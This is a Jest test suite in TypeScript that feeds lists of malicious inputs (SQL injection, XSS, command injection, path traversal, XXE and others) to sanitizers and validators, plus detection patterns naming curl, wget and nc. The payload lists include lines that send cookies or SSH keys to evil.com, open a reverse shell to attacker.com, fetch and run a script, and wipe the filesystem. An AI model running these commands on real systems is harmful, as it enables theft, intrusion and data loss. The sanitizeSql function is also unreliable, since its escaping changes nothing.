/**
 * Input Validation and Sanitization Security Tests
 *
 * Comprehensive tests for input validation including:
 * - SQL injection prevention
 * - XSS (Cross-Site Scripting) prevention
 * - Command injection prevention
 * - Path traversal prevention
 * - Buffer overflow prevention
 * - File upload security
 * - Data type validation
 * - Input length limits
 */

import { test, expect, describe, beforeEach, afterEach, jest } from '@jest/globals';
import DOMPurify from 'isomorphic-dompurify';
import validator from 'validator';

class InputValidationTestSuite {
  static generateMaliciousPayloads() {
    return {
      sqlInjection: [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        '" OR "1"="1',
        "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
        "' UNION SELECT * FROM admin_users --",
        "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
        "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
        "'; EXEC xp_cmdshell('dir'); --",
        "' OR 1=1; DROP DATABASE testdb; --",
        "\'; WAITFOR DELAY \'00:00:10\'; --"
      ],
      
      xssPayloads: [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')" />',
        '<svg onload="alert(\'XSS\')" />',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')" />',
        '<input type="text" onfocus="alert(\'XSS\')" autofocus />',
        '<body onload="alert(\'XSS\')" />',
        '<div style="background-image: url(javascript:alert(\'XSS\'))">',
        '${alert("XSS")}',
        '{{alert("XSS")}}',
        '<script>fetch("/api/steal?data="+document.cookie)</script>',
        '<img src="" onerror="fetch(\'//evil.com\', {method: \'POST\', body: document.cookie})" />'
      ],
      
      commandInjection: [
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& curl evil.com/steal?data=$(cat ~/.ssh/id_rsa)',
        '`cat /etc/shadow`',
        '$(whoami)',
        '; nc -e /bin/bash attacker.com 4444',
        '| wget http://evil.com/malware.sh && bash malware.sh',
        '& powershell -Command "Invoke-WebRequest -Uri http://evil.com"',
        '; python -c "import os; os.system(\'rm -rf /\')"',
        '|| curl http://evil.com/$(cat /etc/passwd | base64)'
      ],
      
      pathTraversal: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '/var/www/../../etc/passwd',
        './../../../etc/passwd%00.jpg',
        'C:\\..\\..\\Windows\\System32\\drivers\\etc\\hosts'
      ],
      
      bufferOverflow: [
        'A'.repeat(10000),
        'A'.repeat(65536),
        'A'.repeat(1048576), // 1MB
        '\x90'.repeat(1000) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68', // NOP sled + shellcode pattern
        '%' + '41'.repeat(1000), // URL encoded buffer overflow
        'A'.repeat(100) + '\n' + 'B'.repeat(100) // Multi-line buffer overflow
      ],
      
      formatString: [
        '%x%x%x%x%x%x%x%x%x',
        '%s%s%s%s%s%s%s%s%s',
        '%n%n%n%n%n%n%n%n%n',
        '%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x',
        '${7*7}',
        '{{7*7}}',
        '%{(#_="This is a test").(#context["xwork.MethodAccessor.denyMethodExecution"]=false)}'
      ],
      
      ldapInjection: [
        '*)(&',
        '*)(uid=*))(|(uid=*',
        '*))(|(password=*))',
        '*))%00',
        '*(objectClass=*',
        '*)(cn=*))%00(objectClass=*'
      ],
      
      xmlInjection: [
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;">]><lolz>&lol2;</lolz>',
        '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">'
      ],
      
      regexDos: [
        '(a+)+$',
        '([a-zA-Z]+)*',
        '(a|a)*',
        '(a|b)*a{33}c',
        'a{100}{100}{100}',
        '^(a+)+$'
      ]
    };
  }
  
  static generateValidationTestCases() {
    return {
      emails: {
        valid: [
          'user@example.com',
          'test.email+tag@example.co.uk',
          'user123@domain-name.org'
        ],
        invalid: [
          'invalid-email',
          'user@',
          '@example.com',
          'user@.com',
          'user@com',
          '<script>alert("xss")</script>@evil.com'
        ]
      },
      
      urls: {
        valid: [
          'https://example.com',
          'http://localhost:3000',
          'ftp://ftp.example.com/file.txt'
        ],
        invalid: [
          'javascript:alert("xss")',
          'data:text/html,<script>alert("xss")</script>',
          'vbscript:msgbox("xss")',
          'file:///etc/passwd',
          'ftp://user:pass@evil.com/../../etc/passwd'
        ]
      },
      
      filenames: {
        valid: [
          'document.pdf',
          'image_123.jpg',
          'my-file.txt'
        ],
        invalid: [
          '../../../etc/passwd',
          'con.txt', // Windows reserved
          'file.exe',
          '.htaccess',
          'file\x00.jpg',
          'file_with_🚀_emoji.txt' // Test Unicode handling
        ]
      }
    };
  }
}

class InputSanitizer {
  static sanitizeHtml(input: string): string {
    return DOMPurify.sanitize(input, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
      ALLOWED_ATTR: [],
      KEEP_CONTENT: true
    });
  }
  
  static sanitizeSql(input: string): string {
    // Basic SQL injection prevention
    return input.replace(/['"\\;]/g, (match) => {
      const replacements: { [key: string]: string } = {
        "'": "\'",
        '"': '\"',
        '\\': '\\\\',
        ';': '\\;'
      };
      return replacements[match];
    });
  }
  
  static validateCommand(input: string): { valid: boolean; reason?: string } {
    const dangerousPatterns = [
      /[;&|`$(){}\[\]<>]/,
      /\b(rm|del|format|fdisk|kill|sudo|su)\b/i,
      /\b(wget|curl|nc|netcat|telnet|ssh)\b/i,
      /(\||&&|;)/,
      /\$\(.*\)/,
      /`.*`/
    ];
    
    for (const pattern of dangerousPatterns) {
      if (pattern.test(input)) {
        return { valid: false, reason: `Dangerous pattern detected: ${pattern.source}` };
      }
    }
    
    return { valid: true };
  }
  
  static validatePath(input: string): { valid: boolean; reason?: string } {
    const dangerousPatterns = [
      /\.\./,
      /\x00/,
      /^\//,
      /^[a-zA-Z]:\\/,
      /%2e%2e/i,
      /%2f/i,
      /%5c/i
    ];
    
    for (const pattern of dangerousPatterns) {
      if (pattern.test(input)) {
        return { valid: false, reason: `Path traversal pattern detected: ${pattern.source}` };
      }
    }
    
    return { valid: true };
  }
  
  static validateFileUpload(filename: string, content: Buffer, maxSize: number = 10 * 1024 * 1024): { valid: boolean; reason?: string } {
    // Check file size
    if (content.length > maxSize) {
      return { valid: false, reason: 'File too large' };
    }
    
    // Check filename
    const pathResult = this.validatePath(filename);
    if (!pathResult.valid) {
      return pathResult;
    }
    
    // Check for dangerous extensions
    const dangerousExtensions = ['.exe', '.bat', '.cmd', '.scr', '.pif', '.com', '.jar', '.js', '.vbs', '.ps1'];
    const extension = filename.toLowerCase().split('.').pop();
    if (extension && dangerousExtensions.includes('.' + extension)) {
      return { valid: false, reason: 'Dangerous file extension' };
    }
    
    // Check for embedded executables in content
    const executableSignatures = [
      Buffer.from([0x4D, 0x5A]), // MZ header (PE executable)
      Buffer.from([0x50, 0x4B, 0x03, 0x04]), // ZIP header
      Buffer.from([0x7F, 0x45, 0x4C, 0x46]), // ELF header
    ];
    
    for (const signature of executableSignatures) {
      if (content.indexOf(signature) === 0) {
        return { valid: false, reason: 'Executable content detected' };
      }
    }
    
    return { valid: true };
  }
}

describe('Input Validation and Sanitization Security Suite', () => {
  describe('SQL Injection Prevention', () => {
    test('should detect and prevent SQL injection attacks', () => {
      const { sqlInjection } = InputValidationTestSuite.generateMaliciousPayloads();
      
      const validateSqlInput = (input: string): { safe: boolean; reason?: string } => {
        const dangerousPatterns = [
          /'.*OR.*'/i,
          /';.*DROP.*TABLE/i,
          /';.*INSERT.*INTO/i,
          /';.*UPDATE.*SET/i,
          /';.*DELETE.*FROM/i,
          /UNION.*SELECT/i,
          /EXEC.*xp_cmdshell/i,
          /WAITFOR.*DELAY/i
        ];
        
        for (const pattern of dangerousPatterns) {
          if (pattern.test(input)) {
            return { safe: false, reason: `SQL injection pattern detected: ${pattern.source}` };
          }
        }
        
        return { safe: true };
      };
      
      sqlInjection.forEach(payload => {
        const result = validateSqlInput(payload);
        expect(result.safe).toBe(false);
        expect(result.reason).toBeDefined();
      });
    });
    
    test('should use parameterized queries', () => {
      // Mock database query function
      const mockDb = {
        query: jest.fn((sql, params) => {
          // Simulate parameterized query
          if (params && Array.isArray(params)) {
            return { success: true, parameterized: true };
          }
          return { success: false, parameterized: false };
        })
      };
      
      // Safe parameterized query
      const safeQuery = (userId: string) => {
        const sql = 'SELECT * FROM users WHERE id = ?';
        return mockDb.query(sql, [userId]);
      };
      
      // Unsafe string concatenation query
      const unsafeQuery = (userId: string) => {
        const sql = `SELECT * FROM users WHERE id = '${userId}'`;
        return mockDb.query(sql);
      };
      
      const maliciousUserId = "'; DROP TABLE users; --";
      
      const safeResult = safeQuery(maliciousUserId);
      const unsafeResult = unsafeQuery(maliciousUserId);
      
      expect(safeResult.parameterized).toBe(true);
      expect(unsafeResult.parameterized).toBe(false);
    });
  });
  
  describe('XSS Prevention', () => {
    test('should sanitize HTML input to prevent XSS', () => {
      const { xssPayloads } = InputValidationTestSuite.generateMaliciousPayloads();
      
      xssPayloads.forEach(payload => {
        const sanitized = InputSanitizer.sanitizeHtml(payload);
        
        // Should not contain executable JavaScript
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toMatch(/on\w+\s*=/i);
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('<iframe');
        
        // Should not contain templating expressions
        expect(sanitized).not.toContain('${');
        expect(sanitized).not.toContain('{{');
      });
    });
    
    test('should validate and sanitize URL inputs', () => {
      const { urls } = InputValidationTestSuite.generateValidationTestCases();
      
      const validateUrl = (url: string): { valid: boolean; sanitized: string } => {
        try {
          const parsed = new URL(url);
          
          // Allow only safe protocols
          const safeProtocols = ['http:', 'https:', 'ftp:'];
          if (!safeProtocols.includes(parsed.protocol)) {
            return { valid: false, sanitized: '' };
          }
          
          return { valid: true, sanitized: parsed.toString() };
        } catch {
          return { valid: false, sanitized: '' };
        }
      };
      
      urls.valid.forEach(url => {
        const result = validateUrl(url);
        expect(result.valid).toBe(true);
      });
      
      urls.invalid.forEach(url => {
        const result = validateUrl(url);
        expect(result.valid).toBe(false);
      });
    });
    
    test('should implement Content Security Policy', () => {
      const cspHeaders = {
        'Content-Security-Policy': [
          "default-src 'self'",
          "script-src 'self' 'unsafe-inline'", // Only for necessary inline scripts
          "style-src 'self' 'unsafe-inline'",
          "img-src 'self' data:",
          "connect-src 'self' ws: wss:",
          "font-src 'self'",
          "frame-src 'none'",
          "object-src 'none'",
          "base-uri 'self'",
          "form-action 'self'"
        ].join('; ')
      };
      
      const mockRes = {
        setHeader: jest.fn()
      };
      
      // Set CSP header
      mockRes.setHeader('Content-Security-Policy', cspHeaders['Content-Security-Policy']);
      
      expect(mockRes.setHeader).toHaveBeenCalledWith(
        'Content-Security-Policy',
        expect.stringContaining("default-src 'self'")
      );
    });
  });
  
  describe('Command Injection Prevention', () => {
    test('should detect and prevent command injection', () => {
      const { commandInjection } = InputValidationTestSuite.generateMaliciousPayloads();
      
      commandInjection.forEach(payload => {
        const result = InputSanitizer.validateCommand(payload);
        expect(result.valid).toBe(false);
        expect(result.reason).toBeDefined();
      });
    });
    
    test('should validate terminal input safely', () => {
      const validateTerminalInput = (input: string): { safe: boolean; sanitized: string } => {
        // Allow basic commands but block dangerous ones
        const allowedCommands = ['ls', 'pwd', 'whoami', 'date', 'echo', 'cat', 'head', 'tail'];
        const command = input.trim().split(' ')[0];
        
        if (!allowedCommands.includes(command)) {
          return { safe: false, sanitized: '' };
        }
        
        const commandValidation = InputSanitizer.validateCommand(input);
        if (!commandValidation.valid) {
          return { safe: false, sanitized: '' };
        }
        
        // Basic sanitization - remove dangerous characters
        const sanitized = input.replace(/[;&|`$(){}\[\]<>]/g, '');
        
        return { safe: true, sanitized };
      };
      
      // Safe commands
      const safeCommands = ['ls -la', 'pwd', 'echo hello world'];
      safeCommands.forEach(cmd => {
        const result = validateTerminalInput(cmd);
        expect(result.safe).toBe(true);
      });
      
      // Dangerous commands
      const dangerousCommands = ['rm -rf /', 'cat /etc/passwd', 'curl evil.com'];
      dangerousCommands.forEach(cmd => {
        const result = validateTerminalInput(cmd);
        expect(result.safe).toBe(false);
      });
    });
  });
  
  describe('Path Traversal Prevention', () => {
    test('should detect and prevent path traversal attacks', () => {
      const { pathTraversal } = InputValidationTestSuite.generateMaliciousPayloads();
      
      pathTraversal.forEach(payload => {
        const result = InputSanitizer.validatePath(payload);
        expect(result.valid).toBe(false);
        expect(result.reason).toBeDefined();
      });
    });
    
    test('should validate file access paths', () => {
      const validateFileAccess = (requestedPath: string, basePath: string = '/safe/directory') => {
        const path = require('path');
        
        // Resolve the full path
        const fullPath = path.resolve(basePath, requestedPath);
        
        // Check if the resolved path is still within the base directory
        const isWithinBase = fullPath.startsWith(path.resolve(basePath));
        
        return {
          allowed: isWithinBase,
          resolvedPath: fullPath,
          reason: isWithinBase ? null : 'Path traversal detected'
        };
      };
      
      // Safe paths
      const safePaths = ['file.txt', 'subdir/file.txt', './file.txt'];
      safePaths.forEach(p => {
        const result = validateFileAccess(p);
        expect(result.allowed).toBe(true);
      });
      
      // Dangerous paths
      const dangerousPaths = ['../../../etc/passwd', '..\\..\\windows\\system32'];
      dangerousPaths.forEach(p => {
        const result = validateFileAccess(p);
        expect(result.allowed).toBe(false);
      });
    });
  });
  
  describe('File Upload Security', () => {
    test('should validate file uploads securely', () => {
      const testFiles = [
        {
          name: 'document.pdf',
          content: Buffer.from('PDF content'),
          shouldBeValid: true
        },
        {
          name: 'malware.exe',
          content: Buffer.from([0x4D, 0x5A, 0x90, 0x00]), // PE executable header
          shouldBeValid: false
        },
        {
          name: 'script.js',
          content: Buffer.from('alert("xss");'),
          shouldBeValid: false
        },
        {
          name: '../../../etc/passwd',
          content: Buffer.from('safe content'),
          shouldBeValid: false
        }
      ];
      
      testFiles.forEach(file => {
        const result = InputSanitizer.validateFileUpload(file.name, file.content);
        expect(result.valid).toBe(file.shouldBeValid);
      });
    });
    
    test('should enforce file size limits', () => {
      const largeFile = Buffer.alloc(11 * 1024 * 1024); // 11MB
      const smallFile = Buffer.alloc(1024); // 1KB
      
      const maxSize = 10 * 1024 * 1024; // 10MB
      
      const largeResult = InputSanitizer.validateFileUpload('large.txt', largeFile, maxSize);
      const smallResult = InputSanitizer.validateFileUpload('small.txt', smallFile, maxSize);
      
      expect(largeResult.valid).toBe(false);
      expect(largeResult.reason).toContain('too large');
      expect(smallResult.valid).toBe(true);
    });
  });
  
  describe('Buffer Overflow Prevention', () => {
    test('should enforce input length limits', () => {
      const { bufferOverflow } = InputValidationTestSuite.generateMaliciousPayloads();
      
      const validateInputLength = (input: string, maxLength: number = 1000) => {
        if (input.length > maxLength) {
          return {
            valid: false,
            reason: `Input too long: ${input.length} > ${maxLength}`,
            truncated: input.substring(0, maxLength)
          };
        }
        return { valid: true };
      };
      
      bufferOverflow.forEach(payload => {
        const result = validateInputLength(payload);
        if (payload.length > 1000) {
          expect(result.valid).toBe(false);
          expect(result.reason).toContain('too long');
        }
      });
    });
    
    test('should handle Unicode and encoding safely', () => {
      const unicodeTestCases = [
        '🚀🚀🚀', // Emoji
        '\u0000\u0001\u0002', // Control characters
        '\uD800\uDC00', // Surrogate pairs
        '\uFEFF', // BOM
        'A'.repeat(1000) + '🚀', // Mixed ASCII and Unicode
      ];
      
      const validateUnicodeInput = (input: string) => {
        // Check for control characters
        if (/[\x00-\x1F\x7F-\x9F]/.test(input)) {
          return { valid: false, reason: 'Control characters detected' };
        }
        
        // Check for valid UTF-8
        try {
          const encoded = Buffer.from(input, 'utf8');
          const decoded = encoded.toString('utf8');
          if (decoded !== input) {
            return { valid: false, reason: 'Invalid UTF-8 encoding' };
          }
        } catch {
          return { valid: false, reason: 'Encoding error' };
        }
        
        return { valid: true };
      };
      
      unicodeTestCases.forEach(testCase => {
        const result = validateUnicodeInput(testCase);
        // Should handle Unicode safely without crashing
        expect(result).toBeDefined();
        expect(typeof result.valid).toBe('boolean');
      });
    });
  });
  
  describe('Data Type Validation', () => {
    test('should validate email addresses', () => {
      const { emails } = InputValidationTestSuite.generateValidationTestCases();
      
      emails.valid.forEach(email => {
        expect(validator.isEmail(email)).toBe(true);
      });
      
      emails.invalid.forEach(email => {
        expect(validator.isEmail(email)).toBe(false);
      });
    });
    
    test('should validate numeric inputs', () => {
      const numericTestCases = [
        { input: '123', valid: true },
        { input: '-456', valid: true },
        { input: '12.34', valid: true },
        { input: '1e5', valid: true },
        { input: 'abc', valid: false },
        { input: '123abc', valid: false },
        { input: '123 OR 1=1', valid: false },
        { input: '${7*7}', valid: false }
      ];
      
      numericTestCases.forEach(testCase => {
        const isValid = validator.isNumeric(testCase.input, { allow_decimals: true, allow_negatives: true });
        expect(isValid).toBe(testCase.valid);
      });
    });
    
    test('should validate JSON input safely', () => {
      const jsonTestCases = [
        { input: '{"name": "test"}', valid: true },
        { input: '[1, 2, 3]', valid: true },
        { input: 'invalid json', valid: false },
        { input: '{"__proto__": {"admin": true}}', valid: false }, // Prototype pollution
        { input: '{"constructor": {"prototype": {"admin": true}}}', valid: false },
        { input: '{}', valid: true },
        { input: 'null', valid: true }
      ];
      
      const validateJson = (input: string) => {
        try {
          const parsed = JSON.parse(input);
          
          // Check for prototype pollution attempts
          if (typeof parsed === 'object' && parsed !== null) {
            if ('__proto__' in parsed || 'constructor' in parsed || 'prototype' in parsed) {
              return { valid: false, reason: 'Potential prototype pollution' };
            }
          }
          
          return { valid: true, parsed };
        } catch {
          return { valid: false, reason: 'Invalid JSON' };
        }
      };
      
      jsonTestCases.forEach(testCase => {
        const result = validateJson(testCase.input);
        expect(result.valid).toBe(testCase.valid);
      });
    });
  });
  
  describe('Regular Expression DoS Prevention', () => {
    test('should prevent ReDoS attacks', () => {
      const { regexDos } = InputValidationTestSuite.generateMaliciousPayloads();
      
      const safeRegexTest = (pattern: string, input: string, timeoutMs: number = 1000) => {
        return new Promise((resolve) => {
          const startTime = Date.now();
          
          const timeoutId = setTimeout(() => {
            resolve({ match: false, timedOut: true, duration: Date.now() - startTime });
          }, timeoutMs);
          
          try {
            const regex = new RegExp(pattern);
            const match = regex.test(input);
            clearTimeout(timeoutId);
            resolve({ match, timedOut: false, duration: Date.now() - startTime });
          } catch (error) {
            clearTimeout(timeoutId);
            resolve({ match: false, timedOut: false, error: error.message, duration: Date.now() - startTime });
          }
        });
      };
      
      // Test with potentially dangerous regex patterns
      const testInput = 'a'.repeat(30);
      
      regexDos.forEach(async (pattern) => {
        const result = await safeRegexTest(pattern, testInput, 100) as any;
        
        // Should either complete quickly or timeout safely
        expect(result.duration).toBeLessThan(200); // Should not take too long
      });
    });
  });
  
  afterEach(() => {
    jest.restoreAllMocks();
  });
});
